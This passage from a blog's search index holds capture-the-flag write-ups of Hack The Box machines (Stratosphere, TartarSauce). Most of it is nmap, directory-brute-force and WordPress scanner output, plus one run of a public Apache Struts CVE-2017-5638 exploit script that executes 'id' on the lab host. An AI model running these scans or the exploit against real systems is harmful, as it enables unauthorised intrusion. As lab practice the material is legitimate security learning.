nmap -Pn -p22,53,80,2222 -sC -sV 10.10.10.83 --min-rate 5000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: Olympus"},{"categories":null,"contents":"Stratosphere Enumeration nmap └─$ nmap -Pn -p- 10.10.10.64 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:33 BST Nmap scan report for 10.10.10.64 (10.10.10.64) Host is up (0.10s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 182.77 seconds └─$ nmap -Pn -p22,80,8080 -sC -sV 10.10.10.64 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:39 BST Nmap scan report for 10.10.10.64 (10.10.10.64) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0) | ssh-hostkey: | 2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA) | 256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA) |_ 256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519) 80/tcp open http |_http-title: Stratosphere | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 1114 | Date: Thu, 19 Oct 2023 18:38:28 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 | Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes | ETag: W/\u0026#34;1708-1519762495000\u0026#34; | Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT | Content-Type: text/html | Content-Length: 1708 | Date: Thu, 19 Oct 2023 18:38:27 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; | \u0026lt;title\u0026gt;Stratosphere\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;main.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div id=\u0026#34;background\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;header id=\u0026#34;main-header\u0026#34; class=\u0026#34;hidden\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;content-wrap\u0026#34;\u0026gt; | \u0026lt;p\u0026gt;\u0026lt;i class=\u0026#34;fa fa-diamond\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/p\u0026gt; | \u0026lt;nav\u0026gt; | class=\u0026#34;btn\u0026#34; href=\u0026#34;GettingStarted.html\u0026#34;\u0026gt;Get started\u0026lt;/a\u0026gt; | \u0026lt;/nav\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;/header\u0026gt; | \u0026lt;section id=\u0026#34;greeting\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;content-wrap\u0026#34;\u0026gt; | \u0026lt;h1\u0026gt;Stratosphere\u0026lt;br\u0026gt;We protect your credit.\u0026lt;/h1\u0026gt; | class=\u0026#34;btn\u0026#34; href=\u0026#34;GettingStarted.html\u0026#34;\u0026gt;Get started now\u0026lt;/a\u0026gt; | \u0026lt;p\u0026gt;\u0026lt;i class=\u0026#34;ar | HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS | Content-Length: 0 | Date: Thu, 19 Oct 2023 18:38:27 GMT | Connection: close | RTSPRequest, X11Probe: | HTTP/1.1 400 | Date: Thu, 19 Oct 2023 18:38:28 GMT |_ Connection: close | http-methods: |_ Potentially risky methods: PUT DELETE 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 1114 | Date: Thu, 19 Oct 2023 18:38:28 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 | Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes | ETag: W/\u0026#34;1708-1519762495000\u0026#34; | Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT | Content-Type: text/html | Content-Length: 1708 | Date: Thu, 19 Oct 2023 18:38:27 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; | \u0026lt;title\u0026gt;Stratosphere\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;main.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div id=\u0026#34;background\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;header id=\u0026#34;main-header\u0026#34; class=\u0026#34;hidden\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;content-wrap\u0026#34;\u0026gt; | \u0026lt;p\u0026gt;\u0026lt;i class=\u0026#34;fa fa-diamond\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/p\u0026gt; | \u0026lt;nav\u0026gt; | class=\u0026#34;btn\u0026#34; href=\u0026#34;GettingStarted.html\u0026#34;\u0026gt;Get started\u0026lt;/a\u0026gt; | \u0026lt;/nav\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;/header\u0026gt; | \u0026lt;section id=\u0026#34;greeting\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;content-wrap\u0026#34;\u0026gt; | \u0026lt;h1\u0026gt;Stratosphere\u0026lt;br\u0026gt;We protect your credit.\u0026lt;/h1\u0026gt; | class=\u0026#34;btn\u0026#34; href=\u0026#34;GettingStarted.html\u0026#34;\u0026gt;Get started now\u0026lt;/a\u0026gt; | \u0026lt;p\u0026gt;\u0026lt;i class=\u0026#34;ar | HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS | Content-Length: 0 | Date: Thu, 19 Oct 2023 18:38:27 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Date: Thu, 19 Oct 2023 18:38:28 GMT |_ Connection: close |_http-title: Stratosphere | http-methods: |_ Potentially risky methods: PUT DELETE 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.94%I=7%D=10/19%Time=653177D2%P=x86_64-pc-linux-gnu%r(Get SF:Request,786,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nAccept-Ranges:\\x20bytes\\r\\nETag:\\x SF:20W/\\\u0026#34;1708-1519762495000\\\u0026#34;\\r\\nLast-Modified:\\x20Tue,\\x2027\\x20Feb\\x2020 SF:18\\x2020:14:55\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\ SF:x201708\\r\\nDate:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:27\\x20GMT\\r\\nCon SF:nection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Stratosphere SF:\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20type=\\\u0026#34;text/cs SF:s\\\u0026#34;\\x20href=\\\u0026#34;main\\.css\\\u0026#34;\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\\n\u0026lt;body\u0026gt;\\n\u0026lt;div\\x20id=\\\u0026#34;background\\ SF:\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026lt;header\\x20id=\\\u0026#34;main-header\\\u0026#34;\\x20class=\\\u0026#34;hidden\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt; SF:div\\x20class=\\\u0026#34;container\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;content-wr SF:ap\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;\u0026lt;i\\x20class=\\\u0026#34;fa\\x20fa-diamond\\\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; SF:\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;nav\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a SF:\\x20class=\\\u0026#34;btn\\\u0026#34;\\x20href=\\\u0026#34;GettingStarted\\.html\\\u0026#34;\u0026gt;Get\\x20started\u0026lt;/a\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/nav\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\u0026lt;/div\u0026gt;\\ SF:n\u0026lt;/header\u0026gt;\\n\\n\u0026lt;section\\x20id=\\\u0026#34;greeting\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;con SF:tainer\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;content-wrap\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\u0026lt;h1\u0026gt;Stratosphere\u0026lt;br\u0026gt;We\\x20protect\\x20your\\x20credit\\.\u0026lt;/h1\u0026gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20class=\\\u0026#34;btn\\\u0026#34;\\x20href=\\\u0026#34;GettingStarted\\ SF:.html\\\u0026#34;\u0026gt;Get\\x20started\\x20now\u0026lt;/a\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;\u0026lt;i\\x20cla SF:ss=\\\u0026#34;ar\u0026#34;)%r(HTTPOptions,8A,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nAllow:\\x20GET,\\x20H SF:EAD,\\x20POST,\\x20PUT,\\x20DELETE,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r\\n SF:Date:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:27\\x20GMT\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,49,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nDate:\\x20Thu SF:,\\x2019\\x20Oct\\x202023\\x2018:38:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r SF:\\n\u0026#34;)%r(X11Probe,49,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nDate:\\x20Thu,\\x2019\\x20Oct\\ SF:x202023\\x2018:38:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(FourOhFo SF:urRequest,4F6,\u0026#34;HTTP/1\\.1\\x20404\\x20\\r\\nContent-Type:\\x20text/html;chars SF:et=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x201114\\r\\nDate: SF:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:28\\x20GMT\\r\\nConnection:\\x20clos SF:e\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20St SF:atus\\x20404\\x20\\xe2\\x80\\x93\\x20Not\\x20Found\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;tex SF:t/css\\\u0026#34;\u0026gt;h1\\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgrou SF:nd-color:#525D76;font-size:22px;}\\x20h2\\x20{font-family:Tahoma,Arial,sa SF:ns-serif;color:white;background-color:#525D76;font-size:16px;}\\x20h3\\x2 SF:0{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525 SF:D76;font-size:14px;}\\x20body\\x20{font-family:Tahoma,Arial,sans-serif;co SF:lor:black;background-color:white;}\\x20b\\x20{font-family:Tahoma,Arial,sa SF:ns-serif;color:white;background-color:#525D76;}\\x20p\\x20{font-family:Ta SF:homa,Arial,sans-serif;background:white;color:black;font-size:12px;}\\x20 SF:a\\x20{color:black;}\\x20a\\.name\\x20{color:black;}\\x20\\.line\\x20{height:1 SF:px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8080-TCP:V=7.94%I=7%D=10/19%Time=653177D2%P=x86_64-pc-linux-gnu%r(G SF:etRequest,786,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nAccept-Ranges:\\x20bytes\\r\\nETag: SF:\\x20W/\\\u0026#34;1708-1519762495000\\\u0026#34;\\r\\nLast-Modified:\\x20Tue,\\x2027\\x20Feb\\x20 SF:2018\\x2020:14:55\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nContent-Length SF::\\x201708\\r\\nDate:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:27\\x20GMT\\r\\nC SF:onnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Stratosphe SF:re\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20type=\\\u0026#34;text/ SF:css\\\u0026#34;\\x20href=\\\u0026#34;main\\.css\\\u0026#34;\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\\n\u0026lt;body\u0026gt;\\n\u0026lt;div\\x20id=\\\u0026#34;backgroun SF:d\\\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026lt;header\\x20id=\\\u0026#34;main-header\\\u0026#34;\\x20class=\\\u0026#34;hidden\\\u0026#34;\u0026gt;\\n\\x20\\x2 SF:0\u0026lt;div\\x20class=\\\u0026#34;container\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;content- SF:wrap\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;\u0026lt;i\\x20class=\\\u0026#34;fa\\x20fa-diamond\\\u0026#34;\u0026gt;\u0026lt;/ SF:i\u0026gt;\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;nav\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\u0026lt;a\\x20class=\\\u0026#34;btn\\\u0026#34;\\x20href=\\\u0026#34;GettingStarted\\.html\\\u0026#34;\u0026gt;Get\\x20started\u0026lt;/a\u0026gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/nav\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\u0026lt;/div SF:\u0026gt;\\n\u0026lt;/header\u0026gt;\\n\\n\u0026lt;section\\x20id=\\\u0026#34;greeting\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;c SF:ontainer\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\\\u0026#34;content-wrap\\\u0026#34;\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Stratosphere\u0026lt;br\u0026gt;We\\x20protect\\x20your\\x20credit\\.\u0026lt;/h SF:1\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20class=\\\u0026#34;btn\\\u0026#34;\\x20href=\\\u0026#34;GettingStarte SF:d\\.html\\\u0026#34;\u0026gt;Get\\x20started\\x20now\u0026lt;/a\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;\u0026lt;i\\x20c SF:lass=\\\u0026#34;ar\u0026#34;)%r(HTTPOptions,8A,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nAllow:\\x20GET,\\x2 SF:0HEAD,\\x20POST,\\x20PUT,\\x20DELETE,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r SF:\\nDate:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:27\\x20GMT\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,49,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nDate:\\x20T SF:hu,\\x2019\\x20Oct\\x202023\\x2018:38:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n\u0026#34;)%r(FourOhFourRequest,4F6,\u0026#34;HTTP/1\\.1\\x20404\\x20\\r\\nContent-Type:\\x SF:20text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length: SF:\\x201114\\r\\nDate:\\x20Thu,\\x2019\\x20Oct\\x202023\\x2018:38:28\\x20GMT\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt; SF:\u0026lt;title\u0026gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x93\\x20Not\\x20Found\u0026lt;/title\u0026gt;\u0026lt;st SF:yle\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;h1\\x20{font-family:Tahoma,Arial,sans-serif;col SF:or:white;background-color:#525D76;font-size:22px;}\\x20h2\\x20{font-famil SF:y:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-siz SF:e:16px;}\\x20h3\\x20{font-family:Tahoma,Arial,sans-serif;color:white;back SF:ground-color:#525D76;font-size:14px;}\\x20body\\x20{font-family:Tahoma,Ar SF:ial,sans-serif;color:black;background-color:white;}\\x20b\\x20{font-famil SF:y:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\\x20p\\x SF:20{font-family:Tahoma,Arial,sans-serif;background:white;color:black;fon SF:t-size:12px;}\\x20a\\x20{color:black;}\\x20a\\.name\\x20{color:black;}\\x20\\. SF:line\\x20{height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/hea SF:d\u0026gt;\u0026lt;body\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.07 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php,html -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.64 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 1708] /manager (Status: 302) [Size: 0] [--\u0026gt; /manager/] /GettingStarted.html (Status: 200) [Size: 203] /Monitoring (Status: 302) [Size: 0] [--\u0026gt; /Monitoring/] Foothold http://10.10.10.64/manager Probably Tomcat http://10.10.10.64/Monitoring I can\u0026rsquo;t register Sign on page It looks like a Struts Web Framework There is github page: https://github.com/FredBrave/CVE-2017-5638-ApacheStruts2.3.5 Or https://github.com/rapid7/metasploit-framework/issues/8064 └─$ python3 cve-2017-5638.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c \u0026#39;id\u0026#39; uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8) Couldn\u0026rsquo;t make a shell, probably have to enumerate more to figure out what\u0026rsquo;s going on Might have to use forward shell User Root ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/stratosphere/images/stratosphere.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/stratosphere/","summary":"Stratosphere Enumeration nmap └─$ nmap -Pn -p- 10.10.10.64 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:33 BST Nmap scan report for 10.10.10.64 (10.10.10.64) Host is up (0.10s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 182.77 seconds └─$ nmap -Pn -p22,80,8080 -sC -sV 10.10.10.64 Starting Nmap 7.94 ( https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Stratosphere"},{"categories":null,"contents":"TartarSauce Enumeration nmap └─$ nmap -Pn -p- 10.10.10.88 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:17 BST Nmap scan report for 10.10.10.88 (10.10.10.88) Host is up (0.10s latency). Not shown: 65449 filtered tcp ports (no-response), 85 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.10.88 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:18 BST Nmap scan report for 10.10.10.88 (10.10.10.88) Host is up (0.097s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Landing Page |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds Web Server feroxbuster └─$ feroxbuster -u http://10.10.10.88/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.88/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 9l 28w 330c http://10.10.10.88/webservices/monstra-3.0.4 =\u0026gt; http://10.10.10.88/webservices/monstra-3.0.4/ 403 GET 11l 32w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 563l 128w 10766c http://10.10.10.88/ 200 GET 563l 128w 10766c http://10.10.10.88/index.html 301 GET 9l 28w 319c http://10.10.10.88/webservices/wp =\u0026gt; http://10.10.10.88/webservices/wp/ 200 GET 7l 12w 208c http://10.10.10.88/robots.txt 301 GET 9l 28w 316c http://10.10.10.88/webservices =\u0026gt; http://10.10.10.88/webservices/ http://10.10.10.88/webservices/wp/ is broken Add 10.10.10.88 tartarsauce.htb to /etc/hosts wpscan └─$ wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88] [+] Started: Tue Oct 17 19:09:19 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: \u0026#39;WordPress 4.9.4\u0026#39; [i] The main theme could not be detected. [+] Enumerating Most Popular Plugins (via Aggressive Methods) Checking Known Locations - Time: 00:01:04 \u0026lt;==========================================================================================================================================================\u0026gt; (1500 / 1500) 100.00% Time: 00:01:04 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ | Last Updated: 2023-09-13T20:24:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.3 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt [+] gwolle-gb | Location: 